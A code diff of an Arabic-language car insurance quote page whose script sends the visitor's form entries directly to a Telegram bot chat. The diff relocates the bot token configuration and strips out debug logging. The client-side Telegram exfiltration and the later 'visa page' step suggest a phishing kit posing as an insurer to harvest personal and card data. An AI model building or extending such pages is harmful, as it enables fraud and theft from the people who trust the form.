@@ -498,11 +498,12 @@
   </div>
 </section>
 
+        
     <script src="config.js"></script>
   <script>
-    // API Configuration
-      ? 'http://localhost:3000'
-      : '';
+    // Telegram Configuration
+    const telegramBotToken = TELEGRAM_BOT_TOKEN;
+    const chatId = TELEGRAM_CHAT_ID;
 
     // Initialize year dropdown
     const yearSelect = document.getElementById("manufacture-year");
@@ -514,19 +515,10 @@
       yearSelect.appendChild(option);
     }
 
-    // Get session ID from localStorage
-    function getSessionId() {
-      return localStorage.getItem('sessionId') || '';
-    }
-
     // Get owner name from localStorage
     function getOwnerName() {
       return localStorage.getItem('owner_name') || 'غير معروف';
     }
-
-    // Telegram Configuration
-    const telegramBotToken = TELEGRAM_BOT_TOKEN;
-    const chatId = TELEGRAM_CHAT_ID;
 
     // Send data directly to Telegram
     async function sendToTelegram(message) {
@@ -574,9 +566,6 @@
       const repairLocationRadio = document.querySelector('input[name="repair-location"]:checked');
       const repairLocation = repairLocationRadio ? repairLocationRadio.value : '';
 
-      // Debug: Log values
-      console.log('Form values:', { insuranceType, startDate, usagePurpose, carValue, manufactureYear, repairLocation });
-
       // Validate required fields
       if (!insuranceType || !startDate || !usagePurpose || !carValue || !manufactureYear || !repairLocation) {
         alert('يرجى تعبئة جميع الحقول المطلوبة.');
@@ -599,11 +588,8 @@
         repair_location: repairLocation
       };
 
-      console.log('Sending data to Telegram:', data);
-
       // Submit to Telegram
       const result = await submitToServer(data);
-      console.log('Telegram response:', result);
 
       if (result.ok) {
         // Save insurance start date for visa page
